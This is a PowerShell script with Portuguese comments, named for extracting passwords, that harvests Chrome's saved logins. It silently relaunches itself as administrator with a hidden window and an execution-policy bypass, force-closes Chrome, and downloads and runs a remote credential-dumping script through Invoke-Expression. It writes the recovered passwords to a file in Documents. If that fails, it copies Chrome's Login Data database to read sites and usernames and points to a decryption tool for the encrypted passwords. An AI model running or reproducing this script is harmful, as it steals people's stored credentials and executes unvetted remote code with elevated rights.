# ExtrairSenhas.ps1 - Versão ATUALIZADA para Chrome v20

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Fecha o Chrome completamente (libera o banco de dados)
Write-Host "Fechando Chrome..." -ForegroundColor Cyan
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

# Tenta o script original primeiro (pode funcionar em versões mais antigas)
Write-Host "Tentando metodo padrao..." -ForegroundColor Cyan
try {
    $script = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' -ErrorAction Stop
    Invoke-Expression $script
    $output = Invoke-PowerChrome -Browser Chrome 2>&1
    
    if ($output -match "https?://" -and $output -notmatch "BCryptDecrypt failed") {
        $output | Out-File -FilePath $arquivoSaida -Encoding UTF8
        Write-Host "SUCESSO! Senhas extraidas." -ForegroundColor Green
        exit
    }
} catch {
    Write-Host "Metodo padrao falhou, tentando metodo alternativo..." -ForegroundColor Yellow
}

# MÉTODO ALTERNATIVO: Leitura direta do banco de dados com fallback
Write-Host "Usando metodo alternativo..." -ForegroundColor Cyan

$loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

if (-not (Test-Path $loginDataPath)) {
    "ERRO: Banco de dados de senhas nao encontrado!" | Out-File -FilePath $arquivoSaida -Encoding UTF8
    Write-Host "Chrome sem senhas salvas!" -ForegroundColor Red
    exit
}

# Copia o banco de dados para evitar bloqueio
$tempDb = "$env:TEMP\login_data_$datahora.db"
Copy-Item $loginDataPath $tempDb -Force

# Usa .NET para ler o SQLite (nativo do Windows)
Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue

if (Get-Module -ListAvailable -Name System.Data.SQLite) {
    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
    $conn.ConnectionString = "Data Source=$tempDb"
    $conn.Open()
    
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value FROM logins"
    $reader = $cmd.ExecuteReader()
    
    $resultados = @()
    while ($reader.Read()) {
        $resultados += [PSCustomObject]@{
            URL = $reader.GetString(0)
            Usuario = $reader.GetString(1)
            Senha = "[CRIPTOGRAFADA - Chrome v20. Use ferramenta especializada]"
        }
    }
    $reader.Close()
    $conn.Close()
    
    if ($resultados.Count -gt 0) {
        $resultados | Format-Table -AutoSize | Out-File -FilePath $arquivoSaida -Encoding UTF8
        Write-Host "SUCESSO! $($resultados.Count) entradas encontradas." -ForegroundColor Green
        Write-Host "ATENCAO: As senhas estao criptografadas. Considere usar Chrome-App-Bound-Decryption." -ForegroundColor Yellow
    } else {
        "Nenhuma senha encontrada." | Out-File -FilePath $arquivoSaida -Encoding UTF8
    }
} else {
    "ERRO: Biblioteca SQLite nao disponivel. Instale o System.Data.SQLite." | Out-File -FilePath $arquivoSaida -Encoding UTF8
}

Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
Write-Host "Processo concluido. Arquivo salvo em: $arquivoSaida" -ForegroundColor Cyan
Start-Sleep -Seconds 2
exit
